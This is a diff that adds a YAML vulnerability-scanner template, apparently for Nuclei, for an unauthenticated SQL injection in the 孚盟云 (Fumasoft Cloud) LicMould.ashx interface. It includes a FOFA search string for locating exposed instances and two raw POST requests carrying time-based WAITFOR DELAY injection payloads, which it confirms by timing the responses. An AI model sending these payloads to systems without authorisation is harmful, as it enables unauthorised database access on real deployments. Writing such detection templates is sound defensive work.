@@ -1,0 +1,29 @@
+id: fumasoft-cloud-licmould-sql
+info:
+  name: "孚盟云 LicMould.ashx 接口 SQL 注入漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: app="孚盟软件-孚盟云"
+          孚盟云的/Common/GetIcon.aspx、/Common/GetPic.aspx和/Ajax/LicMould.ashx接口因未正确过滤用户输入参数，存在可远程利用的SQL注入缺陷。攻击者可通过构造恶意请求在无需身份验证的情况下执行任意SQL语句，从而获取数据库敏感数据。
+  tags: 孚盟云
+http:
+- raw:
+  - |
+    POST /Ajax/LicMould.ashx HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded
+
+    action=DeleteEmp&key=1%20WAITFOR%20DELAY%20'0:0:5'--&fuids=abc,def,
+  - |
+    POST /Ajax/LicMould.ashx HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded
+
+    action=DeleteEmp&key=1%20WAITFOR%20DELAY%20'0:0:8'--&fuids=abc,def,
+  matchers:
+  - type: dsl
+    dsl:
+    - duration_1>=5 && duration_1<=6
+    - duration_2>=8 && duration_2<=9
+    condition: and
